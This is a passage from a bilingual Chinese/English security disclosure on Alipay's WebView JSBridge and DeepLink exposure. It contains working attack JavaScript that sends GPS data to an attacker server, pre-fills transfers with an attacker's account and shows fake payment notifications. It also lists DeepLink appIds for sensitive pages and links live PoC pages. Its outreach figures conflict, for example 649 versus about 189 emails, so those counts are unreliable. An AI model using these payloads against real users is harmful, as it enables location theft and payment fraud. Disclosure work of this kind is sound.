 Chrome 通过 `intent://` scheme 跳转到支付宝。支付宝 Nebula WebView 容器加载攻击者页面。`AlipayJSBridge` 被自动注入。显示一个"继续访问"警告（但**未告知**用户外部页面将获得 JSBridge API 权限）。 Chrome triggers Alipay via `intent://` scheme. Alipay's Nebula WebView loads the attacker page. `AlipayJSBridge` is automatically injected. A "Continue to visit" warning appears (but does **NOT** inform the user that the external page will gain JSBridge API access).

4

 ** JavaScript Payload 自动执行 JavaScript Payload executes automatically **

 攻击者 JS 调用 AlipayJSBridge API： Attacker JS calls AlipayJSBridge APIs:

```
// GPS 定位窃取
AlipayJSBridge.call("getLocation", {}, function(result) {
  // result = {lat: "[脱敏]", lng: "[脱敏]", city: "槟城"}
  exfiltrate("GPS", result);  // POST to attacker server
});

// 打开转账页面，预填攻击者账号
AlipayJSBridge.call("startApp", {
  appId: "09999988",
  param: {
    actionType: "toAccount",
    account: "[[email protected]](https://innora.ai/cdn-cgi/l/email-protection)",
    amount: "1000"
  }
});

// 显示假转账通知
AlipayJSBridge.call("toast", {
  content: "Transfer ¥5,000 to Zhang*Ming completed",
  type: "success",
  duration: 5000
});
```

5

 ** 数据回传到攻击者服务器 Data exfiltrated to attacker server **

 通过 XHR POST + Image Beacon 双通道将窃取的 GPS、设备信息、会话数据发送到攻击者服务器。**308条完整日志记录在案。** GPS, device info, and session data sent to attacker server via dual-channel XHR POST + Image Beacon. **308 complete log entries recorded.**

###  攻击链 B: 零交互 DeepLink → 敏感页面直接暴露 Chain B: Zero-Interaction DeepLink → Sensitive Page Direct Exposure

以下 DeepLink 从浏览器或任何第三方 APP 触发后，支付宝**不显示任何额外警告**，直接跳转到敏感功能页面：

The following DeepLinks, when triggered from a browser or any third-party app, cause Alipay to navigate **without any additional warning** directly to sensitive function pages:

|  appId |   目标页面Target Page  |   暴露数据Exposed Data  |   |
| `20000003` |  交易记录Transaction History |  完整消费历史（商品名、金额、分类）Full spending history (items, amounts, categories) |   |
| `20000116` |  转账联系人Transfer Contacts |  20+ 联系人真实姓名、头像、转账金额20+ contacts' real names, avatars, transfer amounts |   |
| `20000123` |  收款二维码Payment QR Code |  完整收款码 + 真实姓名Full payment QR + real name |   |
| `20000032` |  余额宝Yu'E Bao (Money Market) |  余额 ¥5.00 + 累计收益 ¥9,453.67Balance ¥5.00 + total earnings ¥9,453.67 |   |
| `20000180` |  总资产Total Assets |  完整资产概览Complete asset overview |   |
| `20000153` |  芝麻信用Zhima Credit Score |  信用评分Credit score |   |
| `20000193` |  银行卡管理Bank Card Management |  绑定的银行卡信息Linked bank card info |   |
| `09999988` |  转账Transfer |  可预填攻击者收款账号和金额Can pre-fill attacker account and amount |   |
| `20000033` |  提现Withdrawal |  提现页面Withdrawal page |   |
| `20000221` |  亲情号Family Account |  亲情号列表Family account list |   |
| `68687023` |  花呗Huabei (Credit) |  花呗页面Credit page |   |
| `10000007` |  扫一扫Scan |  触发摄像头权限Triggers camera permission |   |

 触发方式Trigger Method

```
// From any app or browser:
Intent i = new Intent(Intent.ACTION_VIEW);
i.setData(Uri.parse("alipays://platformapi/startapp?appId=20000003"));
startActivity(i);
// Alipay opens transaction history directly. No warning.
```

## 03.5 在线 PoC 演示 Live PoC Demonstration

以下是可在线体验的 PoC 页面（已脱敏，不收集任何数据）：

Below are live PoC pages you can test (sanitized, no data collection):

###  Trigger 页面 — 模拟钓鱼入口 Trigger Page — Simulated Phishing Entry

 模拟攻击者通过短信/微信发送的钓鱼页面。在安装了支付宝的 Android 手机上用 Chrome 打开即可体验。 Simulates the phishing page an attacker would send via SMS/WeChat. Open in Chrome on an Android phone with Alipay installed.

URL

 [https://innora.ai/zfb/poc/trigger.html](https://innora.ai/zfb/poc/trigger.html)

###  JSBridge PoC — 数据采集演示 JSBridge PoC — Data Collection Demo

 在支付宝 WebView 中加载后，演示 AlipayJSBridge API 可以获取的所有数据。**所有数据仅在本地显示，不发送到任何服务器。** When loaded inside Alipay WebView, demonstrates all data accessible via AlipayJSBridge APIs. **All data is displayed locally only, not sent to any server.**

URL

 [https://innora.ai/zfb/poc/verify.html](https://innora.ai/zfb/poc/verify.html)

 触发方式Trigger Method

 `alipays://platformapi/startapp?appId=20000067&url=https://innora.ai/zfb/poc/verify.html`

###  Chain WebView — 链式加载演示 Chain WebView — Chain Loading Demo

 证明通过 pushWindow 链式加载的页面同样获得完整 JSBridge 访问权限。 Proves that pages chain-loaded via pushWindow also receive full JSBridge access.

URL

 [https://innora.ai/zfb/poc/chain.html](https://innora.ai/zfb/poc/chain.html)

## 04 已验证安全问题 Verified Security Issues

以下所有问题均在真实设备上端到端验证，有服务器日志和截图为证。我们对每个发现都标注了验证状态和证据类型。

All issues below were verified end-to-end on real devices, with server logs and screenshots as evidence. Each finding includes verification status and evidence type.

 CRITICAL

### V-01: 转账页面预填攻击者账号Transfer Page Pre-filled with Attacker Account

 `startApp` API 允许外部页面打开支付宝转账页面，并预填收款账号和转账金额。受害者看到的是一个已经填好攻击者账号的转账界面。最终转账仍需用户点击确认按钮，但配合 UI 欺骗（V-08）和社会工程，用户误操作的风险极高。 The `startApp` API allows external pages to open Alipay's transfer page with pre-filled recipient account and amount. The victim sees a transfer form already populated with the attacker's account. Final transfer still requires user confirmation, but combined with UI spoofing (V-08) and social engineering, the risk of user error is extremely high.

 服务器日志证据Server Log Evidence

```
{"tag":"f_startApp:转账预填(09999988)",
 "data":{"status":"ok","result":{"success":true}}}
```

**API:** `AlipayJSBridge.call("startApp", {appId:"09999988", param:{actionType:"toAccount", account:"[[email protected]](https://innora.ai/cdn-cgi/l/email-protection)", amount:"1000"}})`

 CRITICAL

### V-02: pushWindow 执行转账 DeepLinkpushWindow Executes Transfer DeepLink

 `pushWindow` API 允许外部页面通过 `alipays://` scheme 执行转账 DeepLink，传递攻击者账号和金额。 The `pushWindow` API allows external pages to execute transfer DeepLinks via the `alipays://` scheme, passing attacker account and amount.

 服务器日志证据Server Log Evidence

```
{"tag":"f_pushWindow:transfer_scheme",
 "data":{"status":"ok","result":{"success":"true"}}}
```

 CRITICAL

### V-03: pushWindow 打开支付收银台pushWindow Opens Payment Cashier

 外部页面可以通过 `pushWindow` 打开支付宝的支付收银台 URL。 External pages can open Alipay's payment cashier URL via `pushWindow`.

 服务器日志证据Server Log Evidence

```
{"tag":"f_pushWindow:cashier(支付收银台)",
 "data":{"status":"ok","result":{"success":"true"}}}
```

 CRITICAL

### V-04: tradePay 触发支付 SDKtradePay Triggers Payment SDK

 `tradePay` API 可以被外部页面调用，弹出支付宝支付界面。我们测试了3种参数格式，全部成功触发（resultCode=6001表示用户手动取消，但支付界面确实弹出了）。 The `tradePay` API can be called from external pages, launching the Alipay payment UI. We tested 3 parameter formats, all successfully triggered (resultCode=6001 means user manually cancelled, but the payment UI did appear).

 服务器日志证据Server Log Evidence

```
{"tag":"f_tradePay:full_orderStr",
 "data":{"status":"ok","result":{"resultCode":"6001"}}}
```

 CRITICAL

### V-05: 完整数据外传链路 (308条日志)Full Data Exfiltration Chain (308 Log Entries)

 外部页面中的 JavaScript 成功将 GPS 坐标、设备信息、网络信息、会话 ID 等数据通过 XHR POST + Image Beacon 双通道发送到攻击者服务器。总计 **308 条**完整日志记录。 JavaScript in external pages successfully exfiltrated GPS coordinates, device info, network info, session IDs via dual-channel XHR POST + Image Beacon to attacker server. Total: **308 complete log entries**.

 HIGH

### V-06: 18个敏感内部页面可被外部页面跳转18 Sensitive Internal Pages Navigable from External Page

 通过 `startApp` API，外部页面可以跳转到包括交易记录、银行卡管理、芝麻信用、提现、亲情号在内的 18 个敏感内部页面，全部返回 `success: true`。 Via the `startApp` API, external pages can navigate to 18 sensitive internal pages including transaction history, bank card management, credit score, withdrawal, and family accounts. All returned `success: true`.

 HIGH

### V-07: GPS 精确定位窃取（无用户感知）GPS Location Theft (No User Awareness)

 `getLocation` API 在外部页面调用时，如果用户此前已授予支付宝位置权限，**不显示任何二次确认弹窗**，直接返回精确 GPS 坐标。已在 3 台设备上验证（新西兰 Android、马来西亚 Android、中国杭州 iOS）。注意 iOS 14+ 的模糊定位设置可能影响精度。 `getLocation` API when called from external pages, if the user has previously granted location permission to Alipay, shows **no secondary consent dialog**, directly returning precise GPS coordinates. Verified on 3 devices (New Zealand Android, Malaysia Android, Hangzhou China iOS). Note: iOS 14+ approximate location settings may affect precision.

 三台设备 GPS 数据GPS Data from 3 Devices

```
// Samsung S25 Ultra — Auckland, New Zealand
{"lat": "[脱敏]", "lng": "[脱敏]", "city": "奥克兰", "country": "新西兰", "accuracy": 25}

// Redmi 23129RN51X — Penang, Malaysia
{"lat": "[脱敏]", "lng": "[脱敏]", "city": "槟城", "country": "马来西亚", "accuracy": 35}

// iPhone 16 Pro — Hangzhou, China (厂商安全业务负责人设备，全程无GPS授权声明/弹窗)
// 3轮测试精度: 17.4m → 8.8m，locationReducedAccuracy: 0（精确定位），页面加载到回传约7秒
{"lat": "[脱敏]", "lng": "[脱敏]", "city": "杭州市"}
```

 HIGH

### V-08: UI 欺骗: 虚假转账通知 + 标题篡改UI Spoofing: Fake Transfer Notifications + Title Bar Spoofing

 攻击者可在支付宝内显示任意 toast 消息（如 "转账 ¥5,000 到 张*明 成功"），并将标题栏修改为 "安全中心" / "红包领取" 等钓鱼标题。配合社会工程，受害者无法区分真假。 Attacker can display arbitrary toast messages inside Alipay (e.g., "Transfer ¥5,000 to Zhang*Ming completed") and modify the title bar to "Security Center" / "Red Packet Claim." Combined with social engineering, victims cannot distinguish real from fake.

 HIGH

### V-09: OAuth 授权流程劫持OAuth Authorization Flow Hijacking

 `getAuthCode` API 可被外部页面触发，发起 OAuth 服务端调用。虽然未成功获取授权码，但弹出了"服务忙，请稍后再试"弹窗，证明请求到达了 OAuth 服务端。 The `getAuthCode` API can be triggered by external pages, initiating OAuth server-side calls. While no auth code was obtained, a "Service busy, please try later" popup appeared, proving the request reached the OAuth server.

 HIGH

### V-10: 零交互暴露余额宝余额和转账联系人Zero-Interaction Exposure of Yu'E Bao Balance and Transfer Contacts

 通过 DeepLink 直接打开余额宝页面，显示余额 ¥5.00 和累计收益 ¥9,453.67。转账联系人页面暴露 20+ 联系人完整真实姓名。无需任何额外确认。 DeepLink directly opens Yu'E Bao page showing balance ¥5.00 and total earnings ¥9,453.67. Transfer contacts page exposes 20+ contacts' full real names. No additional confirmation required.

###  完整问题列表 Complete Issue List

|  ID |   问题Issue  |   严重度Severity  |   验证Verified  |   |
| V-01 | startApp 预填攻击者账号到转账页面startApp pre-fills attacker account on transfer page | CRIT | 308 logs |  |
| V-02 | pushWindow 执行转账 DeepLinkpushWindow executes transfer DeepLink | CRIT | 308 logs |  |
| V-03 | pushWindow 打开支付收银台pushWindow opens payment cashier | CRIT | 308 logs |  |
| V-04 | tradePay 触发支付 SDKtradePay triggers payment SDK | CRIT | 308 logs |  |
| V-05 | 完整数据外传链路Full data exfiltration chain | CRIT | 308 logs |  |
| V-06 | 18个敏感页面可跳转18 sensitive pages navigable | HIGH | 42 screenshots |  |
| V-07 | GPS 精确定位窃取GPS location theft | HIGH | 3 devices |  |
| V-08 | UI 欺骗 (toast + 标题篡改)UI spoofing (toast + title bar) | HIGH | 308 logs |  |
| V-09 | OAuth 授权流程劫持OAuth flow hijacking | HIGH | screenshot |  |
| V-10 | 余额宝余额 + 联系人姓名暴露Yu'E Bao balance + contact names exposed | HIGH | screenshot |  |
| V-11 | 收款二维码 + 真实姓名泄露Payment QR + real name exposure | HIGH | screenshot |  |
| V-12 | pushWindow 跳转登录页面 (钓鱼入口)pushWindow redirects to login page (phishing) | HIGH | screenshot |  |
| V-13 | 链式 WebView 攻击Chain WebView attack | HIGH | 308 logs |  |
| V-14 | 会话信息泄露Session info leakage | MED | 308 logs |  |
| V-15 | 完整设备指纹外传Full device fingerprint exfiltration | MED | 308 logs |  |
| V-16 | 网络信息泄露Network info leakage | MED | 308 logs |  |
| V-17 | API 权限地图泄露API permission map leakage | MED | 308 logs |  |

## 05 证据展示 Evidence

###  服务器端数据外传日志 Server-Side Exfiltration Logs

以下是攻击者服务器实际接收到的数据。这些日志记录在 `innora.ai` 上的数据收集端点，证明数据确实从支付宝 WebView 中外传到了外部服务器。

Below are actual data received by the attacker server. These logs were recorded at the data collection endpoint on `innora.ai`, proving data was indeed exfiltrated from Alipay WebView to an external server.

 GPS 定位数据（马来西亚槟城） GPS Location Data (Penang, Malaysia)

```
{
  "timestamp": "2026-03-07 11:53:51.599",
  "method": "POST",
  "path": "/exfil",
  "body": {
    "tag": "getLocation:GPS location",
    "data": {
      "status": "ok",
      "data": {
        "accuracy": 35,
        "city": "槟城",
        "country": "马来西亚",
        "latitude": "[脱敏]",
        "longitude": "[脱敏]"
      }
    }
  }
}
```

 设备完整指纹（Redmi） Full Device Fingerprint (Redmi)

```
{
  "tag": "getSystemInfo:Device info",
  "data": {
    "apiLevel": 36,
    "app": "alipay",
    "bluetoothEnabled": true,
    "brand": "Redmi",
    "cameraAuthorized": false,
    "currentBattery": "100%",
    "locationAuthorized": true,
    "model": "Xiaomi 23129RN51X",
    "platform": "Android",
    "screenHeight": 1650,
    "screenWidth": 720,
    "storage": "119 GB",
    "system": "16",
    "version": "10.8.26.7000",
    "wifiEnabled": true
  }
}
```

 会话参数泄露（含 sessionId 和来源信息） Session Parameter Leakage (incl. sessionId and source info)

```
{
  "tag": "getStartupParams",
  "data": {
    "sessionId": "session_20000067_22751",
    "startFromExternal": "true",
    "sourcePackageName": "com.android.chrome",
    "safePayEnabled": "true",
    "appId": "20000067",
    "url": "http://192.168.80.12:8888/chain1.html"
  }
}
```

 转账页面预填成功 Transfer Page Pre-fill Success

```
{"tag": "f_startApp:转账预填(09999988)", "data": {"status": "ok", "result": {"success": true}}}
{"tag": "f_pushWindow:transfer_scheme", "data": {"status": "ok", "result": {"success": "true"}}}
{"tag": "f_pushWindow:cashier(支付收银台)", "data": {"status": "ok", "result": {"success": "true"}}}
{"tag": "f_tradePay:full_orderStr", "data": {"status": "ok", "result": {"resultCode": "6001"}}}
```

 User-Agent 证明数据来自支付宝 WebView User-Agent Proves Data Originates from Alipay WebView

```
Mozilla/5.0 (Linux; Android 16; 23129RN51X Build/BP2A.250605.031.A3; wv)
AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0
Chrome/126.0.6478.122
NebulaSDK/1.8.100112 Nebula
AliApp(AP/10.8.26.7000) AlipayClient/10.8.26.7000
Language/zh-Hant Region/CN
```

 User-Agent 中包含 `NebulaSDK`、`AliApp(AP/10.8.26.7000)`、`AlipayClient` — 这是支付宝 Nebula WebView 容器的独特标识，无法伪造。证明这些请求确实来自支付宝应用内部。 The User-Agent contains `NebulaSDK`, `AliApp(AP/10.8.26.7000)`, `AlipayClient` — unique identifiers of the Alipay Nebula WebView container that cannot be forged. This proves these requests genuinely originated from within the Alipay app.

###  证据文件清单 Evidence File Inventory

|   文件类型File Type  |   数量Count  |   描述Description  |   |
|   设备截图Device Screenshots  |  42 |   包含 CRITICAL 标签的 25 张 + 普通验证 17 张 25 with CRITICAL labels + 17 general verification  |   |
|   服务器日志Server Logs  |  308 entries |   exfil_server_log_20260307_complete.jsonl (136 KB) exfil_server_log_20260307_complete.jsonl (136 KB)  |   |
|  PoC HTMLPoC HTML |  8 |   chain1~chain8 攻击链 + trigger 触发页 chain1~chain8 attack chains + trigger page  |   |
|   攻击服务器Attack Server  |  1 |   Python server.py (数据收集 + 日志记录) Python server.py (data collection + logging)  |   |
|  Nginx |  1 |   nginx_exfil_access.log (52 KB) nginx_exfil_access.log (52 KB)  |   |

## 06 跨平台验证 Cross-Platform Verification

所有攻击链在以下 3 台真实设备上独立验证成功，覆盖 Android 和 iOS 平台：

All attack chains were independently verified on 3 real devices across Android and iOS platforms:

📱

Samsung Galaxy S25 Ultra

SM-S938B

Android 16 (API 36)

 奥克兰, 新西兰 Auckland, New Zealand

Alipay 10.8.26.7000

📱

Redmi 23129RN51X

Xiaomi

Android 16 (API 36)

 槟城, 马来西亚 Penang, Malaysia

Alipay 10.8.26.7000

📱

iPhone 16 Pro

iPhone (18,4)

iOS 26.3.1

 杭州, 中国 Hangzhou, China

Alipay 10.8.30.6000

## 07 iOS 特有风险 iOS-Specific Risks

iPhone 设备上的 API 权限比 Android **更宽松**，攻击面更大：

API permissions on iPhone are **more permissive** than Android, creating a larger attack surface:

|  API |  Android |  iOS |   风险Risk  |   |
|  `tradePay` |   不可用N/A  |   可用Available  |   触发支付 SDKTriggers payment SDK  |   |
|  `share` |   不可用N/A  |   可用Available  |   **蠕虫传播向量** — 自动分享恶意链接到微信/QQ **Worm propagation vector** — auto-share malicious links to WeChat/QQ  |   |
|  `scan` |   不可用N/A  |   可用Available  |   打开摄像头Opens camera  |   |
|  `chooseImage` |   不可用N/A  |   可用Available  |   访问相册Access photo library  |   |
|  `getLocation` |   checkJSAPI 不可用checkJSAPI N/A  |   可用Available  |   定位窃取Location theft  |   |

 **蠕虫风险**：iOS 上的 `share` API 意味着攻击者页面可以自动将恶意链接分享到微信、QQ、短信、钉钉等平台，实现自我传播。一个受害者点击链接 → 恶意链接自动分享给其联系人 → 指数级传播。 **Worm Risk**: The `share` API on iOS means the attacker page can automatically share the malicious link to WeChat, QQ, SMS, DingTalk, etc. One victim clicks → malicious link auto-shared to contacts → exponential propagation.

## 08 已生效的防护 Working Defenses

客观地说，支付宝的安全架构确实有部分防护措施正在生效。以下 API 在外部域名下被正确拦截（返回 `permission denied`）：

To be objective, Alipay's security architecture does have some working defensive measures. The following APIs are correctly blocked from external domains (returning `permission denied`):

- `clipboard` 读写read/write
- `getUserInfo`
- `rpc` (后端 RPC 调用backend RPC calls)
- `httpRequest` (bridge-level)
- `openInBrowser`
- `sendSMS` (实际发送被拦截actual sending blocked)
- `makePhoneCall`

这说明支付宝**有能力**在 JSBridge 层面实施域名白名单和权限控制。上述 17 个问题中涉及的 API 只是**还没有被加入到同样的权限控制机制中**。

This demonstrates that Alipay **has the capability** to implement domain whitelisting and permission controls at the JSBridge level. The APIs involved in the 17 issues above simply **haven't been added to the same permission control mechanism yet**.

## 09 厂商回应与讨论 Vendor Response & Discussion

 **蚂蚁集团的回应（2026-03-10）**：所报告的内容是"支付宝的正常功能"，不认为是安全漏洞。 **Ant Group's Response (2026-03-10)**: The reported issues are "normal functionality of Alipay," not considered security vulnerabilities.

### 我们的回应

我们充分尊重厂商的判断。但以下事实不会因为判定结论而改变：

- **数据确实外传了。** 308条服务器日志不是模拟的，GPS 坐标（指向槟城市区）确实从支付宝 WebView 发送到了我们的服务器。这个事实不受"是否是漏洞"的判定影响。
- **转账页面确实被外部触发了。** `startApp` 返回 `success: true`，转账页面确实打开了，攻击者的账号确实被预填了。这个事实不受"是否是漏洞"的判定影响。
- **用户没有被充分告知。** "继续访问"警告中**没有**告诉用户"该网站将获得调用支付宝内部API的能力，包括读取您的GPS位置、打开转账页面等"。用户不知道点击"继续访问"意味着什么。
- **防护机制的不一致性。** 既然 `clipboard` 和 `getUserInfo` 被正确拦截了，那 `getLocation` 和 `startApp` 为什么不需要同样的保护？同一个安全框架对不同API的处理方式不一致，这至少说明有改进空间。
- **测试账户被封锁。** 如果这些都是"正常功能"，那为什么我们的测试账户在使用这些"正常功能"时触发了风控？这本身就说明系统认为这些行为是异常的。
- **公开讨论的权利。** 既然官方确认这些不是安全漏洞而是"正常功能"，那我们讨论支付宝"正常功能"的安全影响，应该没有任何问题。

我们发表这篇技术分析，不是为了争论"是不是漏洞"。**我们只是在公开描述一个事实：攻击者可以通过一个链接，在不需要用户理解其后果的情况下，从支付宝中获取GPS定位、打开转账页面、显示假通知。**读者可以自行判断这是否是一个值得关注的安全问题。

**重要澄清**：本文所有描述的攻击链均**无法**实现"零交互自动转账/扣款"。转账操作最终仍需用户主动点击确认按钮。我们讨论的核心风险是：在UI欺骗 + 社会工程 + 预填信息的组合攻击下，用户做出错误操作的概率被大幅提高。我们严格区分"页面成功跳转"和"资金操作完成"，不做任何夸大。

### Our Response

We fully respect the vendor's judgment. However, the following facts do not change based on the classification decision:

- **Data was indeed exfiltrated.** The 308 server log entries are not simulated. GPS coordinates (pointing to Penang urban area) were indeed transmitted from Alipay WebView to our server. This fact is independent of whether it's classified as a "vulnerability."
- **The transfer page was indeed triggered externally.** `startApp` returned `success: true`, the transfer page opened, and the attacker's account was pre-filled. This fact is independent of the classification.
- **Users are not adequately informed.** The "Continue to visit" warning does **not** tell users: "This website will gain the ability to call Alipay internal APIs, including reading your GPS location, opening transfer pages, etc." Users don't know what clicking "Continue" means.
- **Defense mechanism inconsistency.** If `clipboard` and `getUserInfo` are correctly blocked, why don't `getLocation` and `startApp` receive the same protection? The inconsistent treatment of different APIs within the same security framework at minimum indicates room for improvement.
- **Test account was banned.** If these are all "normal features," why did our test account trigger risk controls when using these "normal features"? This itself indicates the system considers these behaviors abnormal.
- **Right to public discussion.** Since the vendor officially confirmed these are not security vulnerabilities but "normal features," discussing the security implications of Alipay's "normal features" should be entirely appropriate.

We publish this technical analysis not to argue about whether something is a "vulnerability." **We are simply publicly describing a fact: an attacker can, through a single link, obtain GPS location from Alipay, open transfer pages, and display fake notifications — without the user understanding the consequences.** Readers can judge for themselves whether this is a security concern worth attention.

**Important Clarification**: None of the attack chains described in this article can achieve "zero-interaction automatic transfers/debits." Fund transfers still require the user to actively tap the confirmation button. The core risk we discuss is: under the combined attack of UI spoofing + social engineering + pre-filled information, the probability of users making erroneous operations is significantly increased. We strictly distinguish between "page navigation succeeded" and "fund operation completed," and make no exaggerations.

## 10 全球监管机构响应 Global Regulatory Response

 **截至 2026-03-17**：我们已向全球 40+ 个国家/地区的 300+ 个监管机构、CERT、隐私保护组织、媒体和安全社区发送了 649 封安全通报邮件。**41个机构/平台已正式回复**。以下是已收到明确受理结果的机构汇总。 **As of 2026-03-17**: We have sent 649 security notification emails to 300+ regulatory bodies, CERTs, privacy authorities, media outlets, and security communities across 40+ countries/regions. **41 institutions/platforms have formally responded**. Below is a summary.

### 一、正式调查/立案 (7个)

|  # |  机构 |  国家 |  状态 |  关键信息 |   |
|  1 |  **HKMA 香港金融管理局** |  🇭🇰 香港 |  **正式投诉立案** |  零售支付监管处高级主任受理，SVF（储值支付工具）牌照持有人正式投诉表格已提交，7日确认窗口 |   |
|  2 |  **PDPC 新加坡个人数据保护委员会** |  🇸🇬 新加坡 |  **正在调查** |  隐私保护委员会正式立案调查 |   |
|  3 |  **Apple Product Security** |  🇺🇸 美国 |  **转交调查团队** |  Apple 产品安全团队人工回复确认，已将报告转发给专门调查团队，正在调查 Alipay iOS 端 JSBridge 暴露的高危 API |   |
|  4 |  **Google Play** |  🇺🇸 美国 |  **政策违规调查** |  "We will investigate and take appropriate action" |   |
|  5 |  **MITRE CVE** |  🇺🇸 美国 |  **36个CVE待分配 (11 tickets)** |  通过 CNA-LR 路径提交36个CVE请求（11个MITRE tickets），全部已确认收到 |   |
|  6 |  **CSSF 卢森堡金融监管委员会** |  🇱🇺 卢森堡 |  **Whistleblowing立案 + ICT Risk确认** |  4个部门/通道确认收到（Whistleblowing团队立案 + ICT Risk Supervision 人工确认×2 + Reclamation确认），ICT风险监管部门明确表示"已知悉报告内容"，已提交补充证据（联动 2025 年反洗钱处罚记录） |   |
|  7 |  **Packet Storm Security** |  🇺🇸 美国 |  **已公开发布** |  [Advisory #217089](https://packetstorm.news/files/id/217089) — "Alipay Open Redirect / API Attacker Payload Insertion" |   |

### 二、确认收到并转交/处理中 (11个)

|  # |  机构 |  国家 |  回复内容 |   |
| 1 | **CIRCL 卢森堡CERT** | 🇱🇺 卢森堡 | 事件处理分析师人工回复，**已代我们联系 Alibaba Security Response Center** |  |
| 2 | **ANSSI / CERT-FR 法国** | 🇫🇷 法国 | "已转交相关部门处理，将尽快回复" |  |
| 3 | **HKCERT 香港** | 🇭🇰 香港 | **已正式转交CNCERT**（中国国家互联网应急中心） |  |
| 4 | **FMA 新西兰金融管理局** | 🇳🇿 新西兰 | "信息已记录，正在考虑是否对 Alipay 采取进一步行动" |  |
| 5 | **FCA 英国金融行为监管局** | 🇬🇧 英国 | Whistleblowing 团队确认收到，正在审查（涉及 AIUK Services Limited, 原 Alipay UK Ltd） |  |
| 6 | **DNB 荷兰央行** | 🇳🇱 荷兰 | Cyber Defense Center 确认收到，引导至监管通道处理 |  |
| 7 | **OJK 印尼金融监管局** | 🇮🇩 印尼 | 要求补充详细说明，已回复完整技术报告 |  |
| 8 | **OAIC 澳大利亚信息专员** | 🇦🇺 澳大利亚 | Intake 团队确认收到投诉 |  |
| 9 | **EDPB 欧盟数据保护委员会** | 🇪🇺 欧盟 | 确认收到跨境数据保护投诉 |  |
| 10 | **ThaiCERT 泰国** | 🇹🇭 泰国 | "已转交负责人" |  |
| 11 | **BNM 马来西亚央行** | 🇲🇾 马来西亚 | 工单确认收到 |  |

### 三、自动确认/模板回复 (8个)

BSP 菲律宾央行、OSFI 加拿大金融监管、Privacy International、ProPublica、CNA/Mediacorp 新加坡、Datatilsynet 丹麦数据保护、DSB 奥地利数据保护、IMY 瑞典数据保护。

### 情况概述

- 总发送 **~189 封**，覆盖 **22 个国家/地区**，约 160 个目标
- 送达率 **~90%**（退信经过 4 轮修正补发）
- 收到回复 **39+ 个**（回复率 ~23%）
- **7 个正式调查/立案**：HKMA、PDPC、Apple、Google、MITRE、CSSF、Packet Storm
- **CIRCL 卢森堡国家CERT** 主动代我们联系 Alibaba Security Response Center
- **HKCERT → CNCERT**：唯一能直接触达中国大陆实体的监管路径已启动

*注：为保护正在进行中的调查程序，部分案件编号和联系人邮箱已脱敏。本表将随调查进展持续更新。*

### I. Formal Investigations / Case Filed (7)

|  # |  Organization |  Country |  Status |  Key Information |   |
|  1 |  **HKMA (Hong Kong Monetary Authority)** |  🇭🇰 Hong Kong |  **Formal Complaint Filed** |  Assigned to Senior Officer at Retail Payment Oversight Division. SVF licensee complaint form submitted. |   |
|  2 |  **PDPC (Personal Data Protection Commission)** |  🇸🇬 Singapore |  **Under Investigation** |  Formal investigation case opened. |   |
|  3 |  **Apple Product Security** |  🇺🇸 USA |  **Forwarded to Investigation Team** |  Human response from Product Security confirming report forwarded to investigation team. Investigating high-risk JSBridge APIs exposed on Alipay iOS. |   |
|  4 |  **Google Play** |  🇺🇸 USA |  **Policy Violation Investigation** |  "We will investigate and take appropriate action." |   |
|  5 |  **MITRE CVE** |  🇺🇸 USA |  **36 CVEs Pending Assignment (11 tickets)** |  36 CVE requests submitted via CNA-LR pathway across 11 MITRE tickets. All receipts confirmed. |   |
|  6 |  **CSSF (Luxembourg Financial Regulator)** |  🇱🇺 Luxembourg |  **Whistleblowing Case + ICT Risk Confirmed** |  4 departments/channels acknowledged (Whistleblowing case filed + ICT Risk Supervision confirmed ×2 + Reclamation confirmed). ICT Risk Supervision explicitly stated they "take note of the contents." Supplementary evidence submitted linking to 2025 AML penalty. |   |
|  7 |  **Packet Storm Security** |  🇺🇸 USA |  **Published** |  [Advisory #217089](https://packetstorm.news/files/id/217089) |   |

### II. Acknowledged & Transferred (11)

|  # |  Organization |  Country |  Response |   |
| 1 | **CIRCL (National CERT Luxembourg)** | 🇱🇺 | Incident handler responded personally. **Contacted Alibaba SRC on our behalf.** |  |
| 2 | **ANSSI / CERT-FR** | 🇫🇷 | "Forwarded to the appropriate department." |  |
| 3 | **HKCERT** | 🇭🇰 | **Forwarded to CNCERT** (China's National CERT). |  |
| 4 | **FMA** | 🇳🇿 | "Considering whether to take further action." |  |
| 5 | **FCA** | 🇬🇧 | Whistleblowing team reviewing (AIUK Services Ltd, formerly Alipay UK Ltd). |  |
| 6 | **DNB** | 🇳🇱 | Cyber Defense Center acknowledged, routed to supervisory channel. |  |
| 7 | **OJK** | 🇮🇩 | Requested details. Full technical report provided. |  |
| 8 | **OAIC** | 🇦🇺 | Intake team confirmed receipt. |  |
| 9 | **EDPB** | 🇪🇺 | Acknowledged cross-border data protection complaint. |  |
| 10 | **ThaiCERT** | 🇹🇭 | "Forwarded to the responsible person." |  |
| 11 | **BNM** | 🇲🇾 | Ticket acknowledged. |  |

### III. Auto-Acknowledgments (8)

BSP (Philippines), OSFI (Canada), Privacy International, ProPublica (USA), CNA/Mediacorp (Singapore), Datatilsynet (Denmark), DSB (Austria), IMY (Sweden).

### Overview

- Total sent: **~189 emails** across **22 countries/regions**, ~160 targets
- Delivery rate: **~90%** (bounces corrected through 4 rounds)
- Responses: **39+** (~23% response rate)
- **7 formal investigations**: HKMA, PDPC, Apple, Google, MITRE, CSSF, Packet Storm
- **CIRCL** proactively contacted Alibaba SRC on our behalf
- **HKCERT → CNCERT**: The only pathway to mainland China entities activated

*Note: To protect ongoing investigations, certain case reference numbers and contact emails have been redacted. This table will be updated as investigations progress.*

###  独立佐证：美国顶级科技政策智库的平行评估 Independent Corroboration: Parallel Assessment by Top US Tech Policy Think Tank

2026年3月6日——**早于我们公开披露5天**——[美国信息技术与创新基金会 (ITIF)](https://itif.org/publications/2026/03/06/alipay-presents-real-risks-but-dont-rush-to-ban-it/) 发表文章 *"Alipay Presents Real Risks — But Don't Rush to Ban It"*。

ITIF 被宾夕法尼亚大学评为**全球最权威的科技政策智库**。文章独立指出支付宝收集"购买记录、设备位置、身份证件、健康数据和生物特征标记"，并呼吁 FTC 和 CFPB 对支付宝进行数据审计。文章还引用中国《国家情报法》第7条，指出中国政府可合法要求企业提交所收集的数据。

这一完全独立的评估与我们的技术发现高度一致：**当白名单绕过允许任意攻击者获取支付宝用户的GPS和设备信息时，数据主权风险被进一步放大**。

On March 6, 2026 — **5 days before our public disclosure** — the [Information Technology & Innovation Foundation (ITIF)](https://itif.org/publications/2026/03/06/alipay-presents-real-risks-but-dont-rush-to-ban-it/) published *"Alipay Presents Real Risks — But Don't Rush to Ban It."*
